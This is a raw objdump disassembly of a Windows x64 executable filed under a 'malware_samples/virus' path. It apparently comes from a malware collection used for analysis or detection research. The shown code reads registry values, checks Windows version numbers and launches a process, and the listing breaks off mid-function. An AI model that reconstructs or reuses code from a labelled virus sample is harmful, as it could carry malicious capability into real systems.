
malware_samples/virus/19ddacee3df752e6246ee3f9ef5145adef03d163705aa1fea05810e593244121.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	40 55                	rex push %rbp
   140001002:	41 54                	push   %r12
   140001004:	41 57                	push   %r15
   140001006:	48 8d ac 24 20 ee ff 	lea    -0x11e0(%rsp),%rbp
   14000100d:	ff 
   14000100e:	b8 e0 12 00 00       	mov    $0x12e0,%eax
   140001013:	e8 a8 09 00 00       	call   0x1400019c0
   140001018:	48 2b e0             	sub    %rax,%rsp
   14000101b:	48 8b 05 de ff 01 00 	mov    0x1ffde(%rip),%rax        # 0x140021000
   140001022:	48 33 c4             	xor    %rsp,%rax
   140001025:	48 89 85 c0 11 00 00 	mov    %rax,0x11c0(%rbp)
   14000102c:	48 89 9c 24 10 13 00 	mov    %rbx,0x1310(%rsp)
   140001033:	00 
   140001034:	4c 8b f9             	mov    %rcx,%r15
   140001037:	48 89 b4 24 18 13 00 	mov    %rsi,0x1318(%rsp)
   14000103e:	00 
   14000103f:	48 8d 8d c0 01 00 00 	lea    0x1c0(%rbp),%rcx
   140001046:	48 8b da             	mov    %rdx,%rbx
   140001049:	48 89 bc 24 d8 12 00 	mov    %rdi,0x12d8(%rsp)
   140001050:	00 
   140001051:	33 d2                	xor    %edx,%edx
   140001053:	4c 89 b4 24 d0 12 00 	mov    %r14,0x12d0(%rsp)
   14000105a:	00 
   14000105b:	41 b8 00 08 00 00    	mov    $0x800,%r8d
   140001061:	e8 6a 2d 01 00       	call   0x140013dd0
   140001066:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   14000106b:	41 b9 19 00 02 00    	mov    $0x20019,%r9d
   140001071:	45 33 c0             	xor    %r8d,%r8d
   140001074:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001079:	48 8d 15 50 43 01 00 	lea    0x14350(%rip),%rdx        # 0x1400153d0
   140001080:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   140001087:	ff 15 73 3f 01 00    	call   *0x13f73(%rip)        # 0x140015000
   14000108d:	45 33 e4             	xor    %r12d,%r12d
   140001090:	85 c0                	test   %eax,%eax
   140001092:	0f 85 69 01 00 00    	jne    0x140001201
   140001098:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000109d:	48 8d 44 24 34       	lea    0x34(%rsp),%rax
   1400010a2:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400010a7:	48 8d 15 92 43 01 00 	lea    0x14392(%rip),%rdx        # 0x140015440
   1400010ae:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   1400010b3:	44 89 64 24 30       	mov    %r12d,0x30(%rsp)
   1400010b8:	45 33 c9             	xor    %r9d,%r9d
   1400010bb:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400010c0:	45 33 c0             	xor    %r8d,%r8d
   1400010c3:	c7 44 24 34 04 00 00 	movl   $0x4,0x34(%rsp)
   1400010ca:	00 
   1400010cb:	ff 15 3f 3f 01 00    	call   *0x13f3f(%rip)        # 0x140015010
   1400010d1:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400010d6:	48 8d 15 73 43 01 00 	lea    0x14373(%rip),%rdx        # 0x140015450
   1400010dd:	85 c0                	test   %eax,%eax
   1400010df:	c7 44 24 34 04 00 00 	movl   $0x4,0x34(%rsp)
   1400010e6:	00 
   1400010e7:	48 8d 44 24 34       	lea    0x34(%rsp),%rax
   1400010ec:	45 8b f4             	mov    %r12d,%r14d
   1400010ef:	44 0f 44 74 24 30    	cmove  0x30(%rsp),%r14d
   1400010f5:	45 33 c9             	xor    %r9d,%r9d
   1400010f8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400010fd:	45 33 c0             	xor    %r8d,%r8d
   140001100:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140001105:	44 89 64 24 30       	mov    %r12d,0x30(%rsp)
   14000110a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000110f:	ff 15 fb 3e 01 00    	call   *0x13efb(%rip)        # 0x140015010
   140001115:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000111a:	48 8d 15 3f 43 01 00 	lea    0x1433f(%rip),%rdx        # 0x140015460
   140001121:	85 c0                	test   %eax,%eax
   140001123:	c7 44 24 34 04 00 00 	movl   $0x4,0x34(%rsp)
   14000112a:	00 
   14000112b:	48 8d 44 24 34       	lea    0x34(%rsp),%rax
   140001130:	41 8b fc             	mov    %r12d,%edi
   140001133:	0f 44 7c 24 30       	cmove  0x30(%rsp),%edi
   140001138:	45 33 c9             	xor    %r9d,%r9d
   14000113b:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001140:	45 33 c0             	xor    %r8d,%r8d
   140001143:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140001148:	44 89 64 24 30       	mov    %r12d,0x30(%rsp)
   14000114d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001152:	ff 15 b8 3e 01 00    	call   *0x13eb8(%rip)        # 0x140015010
   140001158:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   14000115d:	48 8d 15 04 43 01 00 	lea    0x14304(%rip),%rdx        # 0x140015468
   140001164:	85 c0                	test   %eax,%eax
   140001166:	c7 44 24 34 04 00 00 	movl   $0x4,0x34(%rsp)
   14000116d:	00 
   14000116e:	48 8d 44 24 34       	lea    0x34(%rsp),%rax
   140001173:	41 8b f4             	mov    %r12d,%esi
   140001176:	0f 44 74 24 30       	cmove  0x30(%rsp),%esi
   14000117b:	45 33 c9             	xor    %r9d,%r9d
   14000117e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001183:	45 33 c0             	xor    %r8d,%r8d
   140001186:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   14000118b:	44 89 64 24 30       	mov    %r12d,0x30(%rsp)
   140001190:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001195:	ff 15 75 3e 01 00    	call   *0x13e75(%rip)        # 0x140015010
   14000119b:	85 c0                	test   %eax,%eax
   14000119d:	41 8b cc             	mov    %r12d,%ecx
   1400011a0:	0f 44 4c 24 30       	cmove  0x30(%rsp),%ecx
   1400011a5:	41 83 fe 0e          	cmp    $0xe,%r14d
   1400011a9:	77 18                	ja     0x1400011c3
   1400011ab:	75 49                	jne    0x1400011f6
   1400011ad:	83 ff 18             	cmp    $0x18,%edi
   1400011b0:	77 11                	ja     0x1400011c3
   1400011b2:	75 42                	jne    0x1400011f6
   1400011b4:	81 fe df 6d 00 00    	cmp    $0x6ddf,%esi
   1400011ba:	77 07                	ja     0x1400011c3
   1400011bc:	75 38                	jne    0x1400011f6
   1400011be:	83 f9 04             	cmp    $0x4,%ecx
   1400011c1:	72 33                	jb     0x1400011f6
   1400011c3:	48 8d 15 ae 42 01 00 	lea    0x142ae(%rip),%rdx        # 0x140015478
   1400011ca:	48 8b cb             	mov    %rbx,%rcx
   1400011cd:	e8 de 02 00 00       	call   0x1400014b0
   1400011d2:	84 c0                	test   %al,%al
   1400011d4:	74 20                	je     0x1400011f6
   1400011d6:	48 8d 15 bb 42 01 00 	lea    0x142bb(%rip),%rdx        # 0x140015498
   1400011dd:	48 8b cb             	mov    %rbx,%rcx
   1400011e0:	e8 cb 02 00 00       	call   0x1400014b0
   1400011e5:	84 c0                	test   %al,%al
   1400011e7:	74 0d                	je     0x1400011f6
   1400011e9:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400011ee:	ff 15 14 3e 01 00    	call   *0x13e14(%rip)        # 0x140015008
   1400011f4:	eb 23                	jmp    0x140001219
   1400011f6:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   1400011fb:	ff 15 07 3e 01 00    	call   *0x13e07(%rip)        # 0x140015008
   140001201:	4c 8d 05 b8 42 01 00 	lea    0x142b8(%rip),%r8        # 0x1400154c0
   140001208:	ba 00 04 00 00       	mov    $0x400,%edx
   14000120d:	48 8d 8d c0 01 00 00 	lea    0x1c0(%rbp),%rcx
   140001214:	e8 d7 3d 00 00       	call   0x140004ff0
   140001219:	48 8d 0d e0 42 01 00 	lea    0x142e0(%rip),%rcx        # 0x140015500
   140001220:	ff 15 32 3e 01 00    	call   *0x13e32(%rip)        # 0x140015058
   140001226:	4c 8b b4 24 d0 12 00 	mov    0x12d0(%rsp),%r14
   14000122d:	00 
   14000122e:	48 8b bc 24 d8 12 00 	mov    0x12d8(%rsp),%rdi
   140001235:	00 
   140001236:	48 8b b4 24 18 13 00 	mov    0x1318(%rsp),%rsi
   14000123d:	00 
   14000123e:	48 85 c0             	test   %rax,%rax
   140001241:	75 3b                	jne    0x14000127e
   140001243:	4c 8d 05 b6 42 01 00 	lea    0x142b6(%rip),%r8        # 0x140015500
   14000124a:	48 8b d3             	mov    %rbx,%rdx
   14000124d:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140001251:	ff 15 71 40 01 00    	call   *0x14071(%rip)        # 0x1400152c8
   140001257:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   14000125b:	ff 15 f7 3d 01 00    	call   *0x13df7(%rip)        # 0x140015058
   140001261:	48 85 c0             	test   %rax,%rax
   140001264:	75 18                	jne    0x14000127e
   140001266:	4c 8d 05 b3 42 01 00 	lea    0x142b3(%rip),%r8        # 0x140015520
   14000126d:	ba 00 04 00 00       	mov    $0x400,%edx
   140001272:	48 8d 8d c0 01 00 00 	lea    0x1c0(%rbp),%rcx
   140001279:	e8 72 3d 00 00       	call   0x140004ff0
   14000127e:	48 8b 9c 24 10 13 00 	mov    0x1310(%rsp),%rbx
   140001285:	00 
   140001286:	66 44 39 a5 c0 01 00 	cmp    %r12w,0x1c0(%rbp)
   14000128d:	00 
   14000128e:	0f 84 32 01 00 00    	je     0x1400013c6
   140001294:	4c 8d 85 c0 01 00 00 	lea    0x1c0(%rbp),%r8
   14000129b:	48 8d 15 ae 42 01 00 	lea    0x142ae(%rip),%rdx        # 0x140015550
   1400012a2:	48 8d 8d c0 09 00 00 	lea    0x9c0(%rbp),%rcx
   1400012a9:	ff 15 39 40 01 00    	call   *0x14039(%rip)        # 0x1400152e8
   1400012af:	4c 8d 05 2a 43 01 00 	lea    0x1432a(%rip),%r8        # 0x1400155e0
   1400012b6:	49 8b d7             	mov    %r15,%rdx
   1400012b9:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   1400012bd:	ff 15 05 40 01 00    	call   *0x14005(%rip)        # 0x1400152c8
   1400012c3:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   1400012c7:	ff 15 bb 3d 01 00    	call   *0x13dbb(%rip)        # 0x140015088
   1400012cd:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400012d0:	75 1f                	jne    0x1400012f1
   1400012d2:	45 33 c9             	xor    %r9d,%r9d
   1400012d5:	48 8d 95 c0 09 00 00 	lea    0x9c0(%rbp),%rdx
   1400012dc:	45 33 c0             	xor    %r8d,%r8d
   1400012df:	33 c9                	xor    %ecx,%ecx
   1400012e1:	ff 15 09 40 01 00    	call   *0x14009(%rip)        # 0x1400152f0
   1400012e7:	b8 29 23 00 00       	mov    $0x2329,%eax
   1400012ec:	e9 d7 00 00 00       	jmp    0x1400013c8
   1400012f1:	4c 8d 05 58 43 01 00 	lea    0x14358(%rip),%r8        # 0x140015650
   1400012f8:	ba 00 04 00 00       	mov    $0x400,%edx
   1400012fd:	48 8d 8d c0 09 00 00 	lea    0x9c0(%rbp),%rcx
   140001304:	e8 e7 3c 00 00       	call   0x140004ff0
   140001309:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   14000130f:	48 8d 95 c0 09 00 00 	lea    0x9c0(%rbp),%rdx
   140001316:	45 33 c0             	xor    %r8d,%r8d
   140001319:	33 c9                	xor    %ecx,%ecx
   14000131b:	ff 15 cf 3f 01 00    	call   *0x13fcf(%rip)        # 0x1400152f0
   140001321:	83 f8 07             	cmp    $0x7,%eax
   140001324:	75 0a                	jne    0x140001330
   140001326:	b8 2a 23 00 00       	mov    $0x232a,%eax
   14000132b:	e9 98 00 00 00       	jmp    0x1400013c8
   140001330:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001333:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
   140001337:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   14000133c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001341:	c7 44 24 40 70 00 00 	movl   $0x70,0x40(%rsp)
   140001348:	00 
   140001349:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   14000134e:	c7 44 24 44 40 00 00 	movl   $0x40,0x44(%rsp)
   140001355:	00 
   140001356:	0f 11 44 24 70       	movups %xmm0,0x70(%rsp)
   14000135b:	c7 44 24 70 01 00 00 	movl   $0x1,0x70(%rsp)
   140001362:	00 
   140001363:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140001368:	0f 11 44 24 60       	movups %xmm0,0x60(%rsp)
   14000136d:	0f 11 45 80          	movups %xmm0,-0x80(%rbp)
   140001371:	0f 11 45 90          	movups %xmm0,-0x70(%rbp)
   140001375:	0f 11 45 a0          	movups %xmm0,-0x60(%rbp)
   140001379:	ff 15 39 3f 01 00    	call   *0x13f39(%rip)        # 0x1400152b8
   14000137f:	85 c0                	test   %eax,%eax
   140001381:	75 07                	jne    0x14000138a
   140001383:	b8 2b 23 00 00       	mov    $0x232b,%eax
   140001388:	eb 3e                	jmp    0x1400013c8
   14000138a:	48 8b 4d a8          	mov    -0x58(%rbp),%rcx
   14000138e:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   140001393:	44 89 64 24 30       	mov    %r12d,0x30(%rsp)
   140001398:	ff 15 aa 3c 01 00    	call   *0x13caa(%rip)        # 0x140015048
   14000139e:	48 8b 4d a8          	mov    -0x58(%rbp),%rcx
   1400013a2:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400013a7:	ff 15 73 3c 01 00    	call   *0x13c73(%rip)        # 0x140015020
   1400013ad:	48 8b 4d a8          	mov    -0x58(%rbp),%rcx
   1400013b1:	ff 15 c1 3c 01 00    	call   *0x13cc1(%rip)        # 0x140015078
   1400013b7:	8b 44 24 30          	mov    0x30(%rsp),%eax
   1400013bb:	f7 d8                	neg    %eax
   1400013bd:	1b c0                	sbb    %eax,%eax
   1400013bf:	25 2c 23 00 00       	and    $0x232c,%eax
   1400013c4:	eb 02                	jmp    0x1400013c8
   1400013c6:	33 c0                	xor    %eax,%eax
   1400013c8:	48 8b 8d c0 11 00 00 	mov    0x11c0(%rbp),%rcx
   1400013cf:	48 33 cc             	xor    %rsp,%rcx
   1400013d2:	e8 49 06 00 00       	call   0x140001a20
   1400013d7:	48 81 c4 e0 12 00 00 	add    $0x12e0,%rsp
   1400013de:	41 5f                	pop    %r15
   1400013e0:	41 5c                	pop    %r12
   1400013e2:	5d                   	pop    %rbp
   1400013e3:	c3                   	ret
   1400013e4:	cc                   	int3
   1400013e5:	cc                   	int3
   1400013e6:	cc                   	int3
   1400013e7:	cc                   	int3
   1400013e8:	cc                   	int3
   1400013e9:	cc                   	int3
   1400013ea:	cc                   	int3
   1400013eb:	cc                   	int3
   1400013ec:	cc                   	int3
   1400013ed:	cc                   	int3
   1400013ee:	cc                   	int3
   1400013ef:	cc                   	int3
   1400013f0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400013f5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1400013fa:	57                   	push   %rdi
   1400013fb:	48 83 ec 20          	sub    $0x20,%rsp
   1400013ff:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   140001405:	48 8b d9             	mov    %rcx,%rbx
   140001408:	33 ed                	xor    %ebp,%ebp
   14000140a:	ff 15 40 3c 01 00    	call   *0x13c40(%rip)        # 0x140015050
   140001410:	48 8b f8             	mov    %rax,%rdi
   140001413:	48 85 c0             	test   %rax,%rax
   140001416:	0f 84 80 00 00 00    	je     0x14000149c
   14000141c:	48 8b d0             	mov    %rax,%rdx
   14000141f:	48 8b cb             	mov    %rbx,%rcx
   140001422:	ff 15 10 3c 01 00    	call   *0x13c10(%rip)        # 0x140015038
   140001428:	48 85 c0             	test   %rax,%rax
   14000142b:	74 6f                	je     0x14000149c
   14000142d:	48 8b c8             	mov    %rax,%rcx
   140001430:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140001435:	ff 15 05 3c 01 00    	call   *0x13c05(%rip)        # 0x140015040
   14000143b:	48 8b d7             	mov    %rdi,%rdx
   14000143e:	48 8b cb             	mov    %rbx,%rcx
   140001441:	48 8b f0             	mov    %rax,%rsi
   140001444:	ff 15 36 3c 01 00    	call   *0x13c36(%rip)        # 0x140015080
   14000144a:	d1 e8                	shr    $1,%eax
   14000144c:	8b d8                	mov    %eax,%ebx
   14000144e:	8d 48 01             	lea    0x1(%rax),%ecx
   140001451:	b8 02 00 00 00       	mov    $0x2,%eax
   140001456:	48 f7 e1             	mul    %rcx
   140001459:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140001460:	48 0f 42 c1          	cmovb  %rcx,%rax
   140001464:	48 8b c8             	mov    %rax,%rcx
   140001467:	e8 a8 04 00 00       	call   0x140001914
   14000146c:	48 03 db             	add    %rbx,%rbx
   14000146f:	48 8b d6             	mov    %rsi,%rdx
   140001472:	4c 8b c3             	mov    %rbx,%r8
   140001475:	48 8b c8             	mov    %rax,%rcx
   140001478:	48 8b f8             	mov    %rax,%rdi
   14000147b:	e8 b0 22 01 00       	call   0x140013730
   140001480:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   140001485:	48 8b c7             	mov    %rdi,%rax
   140001488:	66 89 2c 3b          	mov    %bp,(%rbx,%rdi,1)
   14000148c:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140001491:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   140001496:	48 83 c4 20          	add    $0x20,%rsp
   14000149a:	5f                   	pop    %rdi
   14000149b:	c3                   	ret
   14000149c:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400014a1:	48 8b c5             	mov    %rbp,%rax
   1400014a4:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   1400014a9:	48 83 c4 20          	add    $0x20,%rsp
   1400014ad:	5f                   	pop    %rdi
   1400014ae:	c3                   	ret
   1400014af:	cc                   	int3
   1400014b0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400014b5:	57                   	push   %rdi
   1400014b6:	48 81 ec 40 02 00 00 	sub    $0x240,%rsp
   1400014bd:	48 8b 05 3c fb 01 00 	mov    0x1fb3c(%rip),%rax        # 0x140021000
   1400014c4:	48 33 c4             	xor    %rsp,%rax
   1400014c7:	48 89 84 24 30 02 00 	mov    %rax,0x230(%rsp)
   1400014ce:	00 
   1400014cf:	48 8b f9             	mov    %rcx,%rdi
   1400014d2:	48 8b da             	mov    %rdx,%rbx
   1400014d5:	48 8b ca             	mov    %rdx,%rcx
   1400014d8:	ff 15 7a 3b 01 00    	call   *0x13b7a(%rip)        # 0x140015058
   1400014de:	48 85 c0             	test   %rax,%rax
   1400014e1:	75 24                	jne    0x140001507
   1400014e3:	4c 8b c3             	mov    %rbx,%r8
   1400014e6:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400014eb:	48 8b d7             	mov    %rdi,%rdx
   1400014ee:	ff 15 d4 3d 01 00    	call   *0x13dd4(%rip)        # 0x1400152c8
   1400014f4:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400014f9:	ff 15 59 3b 01 00    	call   *0x13b59(%rip)        # 0x140015058
   1400014ff:	48 85 c0             	test   %rax,%rax
   140001502:	0f 95 c0             	setne  %al
   140001505:	eb 02                	jmp    0x140001509
   140001507:	b0 01                	mov    $0x1,%al
   140001509:	48 8b 8c 24 30 02 00 	mov    0x230(%rsp),%rcx
   140001510:	00 
   140001511:	48 33 cc             	xor    %rsp,%rcx
   140001514:	e8 07 05 00 00       	call   0x140001a20
   140001519:	48 8b 9c 24 60 02 00 	mov    0x260(%rsp),%rbx
   140001520:	00 
   140001521:	48 81 c4 40 02 00 00 	add    $0x240,%rsp
   140001528:	5f                   	pop    %rdi
   140001529:	c3                   	ret
   14000152a:	cc                   	int3
   14000152b:	cc                   	int3
   14000152c:	cc                   	int3
   14000152d:	cc                   	int3
   14000152e:	cc                   	int3
   14000152f:	cc                   	int3
   140001530:	48 8d 05 c9 05 02 00 	lea    0x205c9(%rip),%rax        # 0x140021b00
   140001537:	c3                   	ret
   140001538:	cc                   	int3
   140001539:	cc                   	int3
   14000153a:	cc                   	int3
   14000153b:	cc                   	int3
   14000153c:	cc                   	int3
   14000153d:	cc                   	int3
   14000153e:	cc                   	int3
   14000153f:	cc                   	int3
   140001540:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140001545:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   14000154a:	53                   	push   %rbx
   14000154b:	55                   	push   %rbp
   14000154c:	56                   	push   %rsi
   14000154d:	57                   	push   %rdi
   14000154e:	48 83 ec 38          	sub    $0x38,%rsp
   140001552:	49 8b f0             	mov    %r8,%rsi
   140001555:	48 8d 6c 24 78       	lea    0x78(%rsp),%rbp
   14000155a:	48 8b da             	mov    %rdx,%rbx
   14000155d:	48 8b f9             	mov    %rcx,%rdi
   140001560:	e8 cb ff ff ff       	call   0x140001530
   140001565:	48 89 6c 24 28       	mov    %rbp,0x28(%rsp)
   14000156a:	4c 8b ce             	mov    %rsi,%r9
   14000156d:	4c 8b c3             	mov    %rbx,%r8
   140001570:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140001577:	00 00 
   140001579:	48 8b d7             	mov    %rdi,%rdx
   14000157c:	48 8b 08             	mov    (%rax),%rcx
   14000157f:	e8 2c 60 00 00       	call   0x1400075b0
   140001584:	85 c0                	test   %eax,%eax
   140001586:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   14000158b:	0f 48 c1             	cmovs  %ecx,%eax
   14000158e:	48 83 c4 38          	add    $0x38,%rsp
   140001592:	5f                   	pop    %rdi
   140001593:	5e                   	pop    %rsi
   140001594:	5d                   	pop    %rbp
   140001595:	5b                   	pop    %rbx
   140001596:	c3                   	ret
   140001597:	cc                   	int3
   140001598:	cc                   	int3
   140001599:	cc                   	int3
   14000159a:	cc                   	int3
   14000159b:	cc                   	int3
   14000159c:	cc                   	int3
   14000159d:	cc                   	int3
   14000159e:	cc                   	int3
   14000159f:	cc                   	int3
   1400015a0:	40 55                	rex push %rbp
   1400015a2:	57                   	push   %rdi
   1400015a3:	41 54                	push   %r12
   1400015a5:	41 57                	push   %r15
   1400015a7:	48 8d ac 24 c8 f9 ff 	lea    -0x638(%rsp),%rbp
   1400015ae:	ff 
   1400015af:	48 81 ec 38 07 00 00 	sub    $0x738,%rsp
   1400015b6:	48 8b 05 43 fa 01 00 	mov    0x1fa43(%rip),%rax        # 0x140021000
   1400015bd:	48 33 c4             	xor    %rsp,%rax
   1400015c0:	48 89 85 10 06 00 00 	mov    %rax,0x610(%rbp)
   1400015c7:	4d 8b e0             	mov    %r8,%r12
   1400015ca:	48 8d 95 00 04 00 00 	lea    0x400(%rbp),%rdx
   1400015d1:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   1400015d7:	48 8b f9             	mov    %rcx,%rdi
   1400015da:	ff 15 50 3a 01 00    	call   *0x13a50(%rip)        # 0x140015030
   1400015e0:	48 8d 95 00 04 00 00 	lea    0x400(%rbp),%rdx
   1400015e7:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400015eb:	ff 15 e7 3c 01 00    	call   *0x13ce7(%rip)        # 0x1400152d8
   1400015f1:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400015f5:	ff 15 d5 3c 01 00    	call   *0x13cd5(%rip)        # 0x1400152d0
   1400015fb:	ba c9 00 00 00       	mov    $0xc9,%edx
   140001600:	48 8b cf             	mov    %rdi,%rcx
   140001603:	e8 e8 fd ff ff       	call   0x1400013f0
   140001608:	4c 8b f8             	mov    %rax,%r15
   14000160b:	48 85 c0             	test   %rax,%rax
   14000160e:	75 1f                	jne    0x14000162f
   140001610:	45 33 c9             	xor    %r9d,%r9d
   140001613:	48 8d 15 e6 40 01 00 	lea    0x140e6(%rip),%rdx        # 0x140015700
   14000161a:	45 33 c0             	xor    %r8d,%r8d
   14000161d:	33 c9                	xor    %ecx,%ecx
   14000161f:	ff 15 cb 3c 01 00    	call   *0x13ccb(%rip)        # 0x1400152f0
   140001625:	b8 28 23 00 00       	mov    $0x2328,%eax
   14000162a:	e9 9d 02 00 00       	jmp    0x1400018cc
   14000162f:	48 89 9c 24 68 07 00 	mov    %rbx,0x768(%rsp)
   140001636:	00 
   140001637:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   14000163b:	48 89 b4 24 30 07 00 	mov    %rsi,0x730(%rsp)
   140001642:	00 
   140001643:	4c 89 ac 24 28 07 00 	mov    %r13,0x728(%rsp)
   14000164a:	00 
   14000164b:	4c 89 b4 24 20 07 00 	mov    %r14,0x720(%rsp)
   140001652:	00 
   140001653:	e8 b8 61 00 00       	call   0x140007810
   140001658:	49 8b cf             	mov    %r15,%rcx
   14000165b:	48 8b d8             	mov    %rax,%rbx
   14000165e:	e8 ad 61 00 00       	call   0x140007810
   140001663:	49 c7 c5 ff ff ff ff 	mov    $0xffffffffffffffff,%r13
   14000166a:	48 8d 48 14          	lea    0x14(%rax),%rcx
   14000166e:	b8 02 00 00 00       	mov    $0x2,%eax
   140001673:	48 03 cb             	add    %rbx,%rcx
   140001676:	48 f7 e1             	mul    %rcx
   140001679:	49 0f 42 c5          	cmovb  %r13,%rax
   14000167d:	48 8b c8             	mov    %rax,%rcx
   140001680:	e8 8f 02 00 00       	call   0x140001914
   140001685:	4d 8b cf             	mov    %r15,%r9
   140001688:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   14000168c:	48 8d 15 0d 41 01 00 	lea    0x1410d(%rip),%rdx        # 0x1400157a0
   140001693:	48 8b c8             	mov    %rax,%rcx
   140001696:	48 8b d8             	mov    %rax,%rbx
   140001699:	ff 15 49 3c 01 00    	call   *0x13c49(%rip)        # 0x1400152e8
   14000169f:	48 8b d3             	mov    %rbx,%rdx
   1400016a2:	48 8d 8d f0 01 00 00 	lea    0x1f0(%rbp),%rcx
   1400016a9:	ff 15 29 3c 01 00    	call   *0x13c29(%rip)        # 0x1400152d8
   1400016af:	48 8b cb             	mov    %rbx,%rcx
   1400016b2:	e8 65 02 00 00       	call   0x14000191c
   1400016b7:	48 8d 8d f0 01 00 00 	lea    0x1f0(%rbp),%rcx
   1400016be:	ff 15 0c 3c 01 00    	call   *0x13c0c(%rip)        # 0x1400152d0
   1400016c4:	ba ca 00 00 00       	mov    $0xca,%edx
   1400016c9:	48 8b cf             	mov    %rdi,%rcx
   1400016cc:	e8 1f fd ff ff       	call   0x1400013f0
   1400016d1:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400016d5:	4c 8b f0             	mov    %rax,%r14
   1400016d8:	e8 33 61 00 00       	call   0x140007810
   1400016dd:	49 8b cf             	mov    %r15,%rcx
   1400016e0:	48 8b f0             	mov    %rax,%rsi
   1400016e3:	e8 28 61 00 00       	call   0x140007810
   1400016e8:	49 8b ce             	mov    %r14,%rcx
   1400016eb:	48 8b f8             	mov    %rax,%rdi
   1400016ee:	e8 1d 61 00 00       	call   0x140007810
   1400016f3:	49 8b cc             	mov    %r12,%rcx
   1400016f6:	48 8b d8             	mov    %rax,%rbx
   1400016f9:	e8 12 61 00 00       	call   0x140007810
   1400016fe:	48 8d 48 14          	lea    0x14(%rax),%rcx
   140001702:	b8 02 00 00 00       	mov    $0x2,%eax
   140001707:	48 03 ce             	add    %rsi,%rcx
   14000170a:	48 03 d9             	add    %rcx,%rbx
   14000170d:	48 03 df             	add    %rdi,%rbx
   140001710:	48 f7 e3             	mul    %rbx
   140001713:	49 0f 42 c5          	cmovb  %r13,%rax
   140001717:	48 8b c8             	mov    %rax,%rcx
   14000171a:	e8 f5 01 00 00       	call   0x140001914
   14000171f:	4c 89 64 24 30       	mov    %r12,0x30(%rsp)
   140001724:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   140001728:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   14000172d:	4c 8d 05 7c 40 01 00 	lea    0x1407c(%rip),%r8        # 0x1400157b0
   140001734:	48 8b d3             	mov    %rbx,%rdx
   140001737:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   14000173c:	48 8b c8             	mov    %rax,%rcx
   14000173f:	48 8b f0             	mov    %rax,%rsi
   140001742:	e8 f9 fd ff ff       	call   0x140001540
   140001747:	49 8b ce             	mov    %r14,%rcx
   14000174a:	e8 cd 01 00 00       	call   0x14000191c
   14000174f:	49 8b cf             	mov    %r15,%rcx
   140001752:	e8 c5 01 00 00       	call   0x14000191c
   140001757:	48 8d 95 f0 01 00 00 	lea    0x1f0(%rbp),%rdx
   14000175e:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140001762:	e8 99 f8 ff ff       	call   0x140001000
   140001767:	4c 8b b4 24 20 07 00 	mov    0x720(%rsp),%r14
   14000176e:	00 
   14000176f:	8b d8                	mov    %eax,%ebx
   140001771:	85 c0                	test   %eax,%eax
   140001773:	0f 85 25 01 00 00    	jne    0x14000189e
   140001779:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000177c:	c7 44 24 70 68 00 00 	movl   $0x68,0x70(%rsp)
   140001783:	00 
   140001784:	33 c0                	xor    %eax,%eax
   140001786:	45 33 c9             	xor    %r9d,%r9d
